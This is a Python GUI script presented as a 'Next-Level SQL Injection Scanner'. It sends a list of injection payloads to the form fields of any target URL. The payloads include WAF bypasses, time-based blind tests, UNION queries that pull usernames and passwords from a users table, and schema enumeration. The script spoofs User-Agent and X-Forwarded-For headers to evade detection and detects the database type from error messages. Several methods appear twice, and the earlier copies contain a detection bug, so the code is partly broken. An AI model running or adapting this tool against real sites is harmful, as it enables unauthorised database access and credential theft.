import requests
import threading
import random
import time
import json
import csv
import urllib.parse
import pytesseract
from io import BytesIO
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from stem.control import Controller
from stem import Signal
import tkinter as tk
from tkinter import messagebox, filedialog

# 🚀 Advanced SQLi Payloads (WAF Bypasses, Encoded, and Adaptive Payloads)
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR IF(1=1, SLEEP(5), 0) --",
    "' UNION SELECT username, password FROM users --",
    "1'/**/OR/**/1=1/**/--",
    urllib.parse.quote("' OR '1'='1"),
    "0x27+OR+0x31=0x31--",
    "' AND '1'='1' -- ",
    "1' AND 1=CAST((SELECT SLEEP(5)) AS INT) -- ",
    "' UNION SELECT NULL, NULL, NULL --",
    "1' OR '1'='1' -- -",
    "' OR x=x --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --",
]


# 🎭 Randomized User-Agents to Evade Detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

# ⚠️ SQL Error Signatures for Different Databases
SQL_ERRORS = {
    "MySQL": ["You have an error in your SQL syntax", "MySQL server"],
    "MSSQL": ["Microsoft SQL Server", "Unclosed quotation mark"],
    "PostgreSQL": ["PostgreSQL", "syntax error at or near"],
    "Oracle": ["ORA-", "quoted string not properly terminated"],
    "SQLite": ["SQLiteException", "unrecognized token"],
}

class NextLevelSQLiTester:
    def __init__(self, root):
        self.root = root
        self.root.title("💥 Next-Level SQL Injection Scanner")
        self.root.geometry("700x500")

        self.url_label = tk.Label(root, text="Target URL:")
        self.url_label.pack()
        self.url_entry = tk.Entry(root, width=50)
        self.url_entry.pack()

        self.proxy_label = tk.Label(root, text="Burp Proxy (Optional):")
        self.proxy_label.pack()
        self.proxy_entry = tk.Entry(root, width=50)
        self.proxy_entry.insert(0, "http://127.0.0.1:8080")
        self.proxy_entry.pack()

        self.start_button = tk.Button(root, text="Start Scan", command=self.start_scan_thread)
        self.start_button.pack()

        self.export_button = tk.Button(root, text="Export Results", command=self.export_results)
        self.export_button.pack()

        self.result_text = tk.Text(root, height=20, width=80)
        self.result_text.pack()

        self.results = []

    def start_scan_thread(self):
        """Run scanning in a separate thread to prevent GUI freezing"""
        scan_thread = threading.Thread(target=self.run_tests, daemon=True)
        scan_thread.start()

    def get_forms(self, url):
        """Fetch input fields using Selenium"""
        try:
            options = webdriver.ChromeOptions()
            options.add_argument("--headless")
            driver = webdriver.Chrome(options=options)
            driver.get(url)

            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            input_fields = [elem.get_attribute('name') for elem in driver.find_elements(By.TAG_NAME, 'input') if elem.get_attribute('name')]
            driver.quit()
            return input_fields
        except Exception:
            return []

    def detect_db(self, response):
        """Identify the database type based on error messages"""
        db_signatures = {
            "MySQL": ["MySQL server", "You have an error in your SQL syntax"],
            "MSSQL": ["Microsoft SQL Server", "Unclosed quotation mark"],
            "PostgreSQL": ["PostgreSQL", "syntax error at or near"],
            "Oracle": ["ORA-", "quoted string not properly terminated"],
            "SQLite": ["SQLiteException", "unrecognized token"]
        }
        for db, errors in db_signatures.items():
            if any(error in response for error in errors):
                return db
        return "Unknown"

    def test_sqli(self, url, param, proxy):
        """Perform SQLi testing & LOG EVERY RESPONSE"""
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "X-Forwarded-For": "127.0.0.1"
        }
        cookies = {"security": "low"}
        proxies = {"http": proxy, "https": proxy} if proxy else None

        for payload in SQLI_PAYLOADS:
            data = {param: payload}
            start_time = time.time()

            try:
                response = requests.post(url, data=data, headers=headers, cookies=cookies, proxies=proxies, timeout=5)
                end_time = time.time()

                # ✅ NEW: Log every response to debug!
                debug_info = f"\n🔎 Testing param: {param}\n⚔️ Payload: {payload}\n📡 Status: {response.status_code}\n🔄 Response: {response.text[:500]}\n"
                print(debug_info)  # Log to console
                self.update_results(debug_info)  # Show in GUI
                self.root.update_idletasks()  # Force GUI refresh!

            except requests.exceptions.RequestException as e:
                self.update_results(f"🚨 Error with payload {payload} -> {str(e)}\n")
                continue

            db_type = self.detect_db(response.text)

            if any(error in response.text for error in SQL_ERRORS):
                self.update_results(
                    f"⚠️ SQL Injection found! Payload: {payload} on {param}\n💾 Database Type: {db_type}\n")
                self.results.append({"param": param, "payload": payload, "db_type": db_type})

            elif (end_time - start_time) > 5:
                self.update_results(f"⚠️ Possible Blind SQLi (Time Delay) in {param} with {payload}\n")
                self.results.append({"param": param, "payload": payload, "type": "Blind SQLi"})

    def run_tests(self):
        """Run SQL injection tests in parallel threads"""
        url = self.url_entry.get()
        proxy = self.proxy_entry.get()
        if not url:
            self.update_results("❌ Please enter a URL.\n")
            return

        input_fields = self.get_forms(url)
        if not input_fields:
            self.update_results("No input fields detected.\n")
            return

        self.update_results(f"🔍 Testing {len(input_fields)} parameters...\n")

        threads = []
        for param in input_fields:
            thread = threading.Thread(target=self.test_sqli, args=(url, param, proxy))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        self.update_results("✅ Scan Completed.\n")

    def update_results(self, message):
        """Safely update GUI from a separate thread"""
        self.root.after(0, lambda: self.result_text.insert(tk.END, message))

    def export_results(self):
        """Export results to JSON/CSV"""
        if not self.results:
            messagebox.showwarning("No Data", "No results to export.")
            return

        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json"), ("CSV files", "*.csv")])

        if file_path:
            if file_path.endswith(".json"):
                with open(file_path, "w") as json_file:
                    json.dump(self.results, json_file, indent=4)
            elif file_path.endswith(".csv"):
                with open(file_path, "w", newline="") as csv_file:
                    writer = csv.DictWriter(csv_file, fieldnames=["param", "payload", "db_type"])
                    writer.writeheader()
                    writer.writerows(self.results)

            messagebox.showinfo("Success", f"Results saved to {file_path}")









    def start_scan_thread(self):
        scan_thread = threading.Thread(target=self.run_tests, daemon=True)
        scan_thread.start()

    def test_sqli(self, url, param, proxy):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        proxies = {"http": proxy, "https": proxy} if proxy else None

        for payload in SQLI_PAYLOADS:
            data = {param: payload}
            start_time = time.time()

            try:
                response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=5)
                end_time = time.time()

                debug_info = f"\n🔎 Testing param: {param}\n⚔️ Payload: {payload}\n📡 Status: {response.status_code}\n🔄 Response: {response.text[:500]}\n"
                self.update_results(debug_info)
                self.root.update_idletasks()

            except requests.exceptions.RequestException as e:
                self.update_results(f"🚨 Error with payload {payload} -> {str(e)}\n")
                continue

            db_type = self.detect_db(response.text)

            if any(error in response.text for error_list in SQL_ERRORS.values() for error in error_list):
                self.update_results(
                    f"⚠️ SQL Injection found! Payload: {payload} on {param}\n💾 Database Type: {db_type}\n")
                self.results.append({"param": param, "payload": payload, "db_type": db_type})

            elif (end_time - start_time) > 5:
                self.update_results(f"⚠️ Possible Blind SQLi (Time Delay) in {param} with {payload}\n")
                self.results.append({"param": param, "payload": payload, "type": "Blind SQLi"})

    def detect_db(self, response):
        for db, errors in SQL_ERRORS.items():
            if any(error in response for error in errors):
                return db
        return "Unknown"

    def run_tests(self):
        url = self.url_entry.get()
        proxy = self.proxy_entry.get()
        if not url:
            self.update_results("❌ Please enter a URL.\n")
            return

        input_fields = ["username", "password", "search", "id"]  # Replace with dynamic form field extraction if needed
        if not input_fields:
            self.update_results("No input fields detected.\n")
            return

        self.update_results(f"🔍 Testing {len(input_fields)} parameters...\n")
        threads = []
        for param in input_fields:
            thread = threading.Thread(target=self.test_sqli, args=(url, param, proxy))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        self.update_results("✅ Scan Completed.\n")

    def update_results(self, message):
        self.root.after(0, lambda: self.result_text.insert(tk.END, message))


if __name__ == "__main__":
    root = tk.Tk()
    app = NextLevelSQLiTester(root)
    root.mainloop()

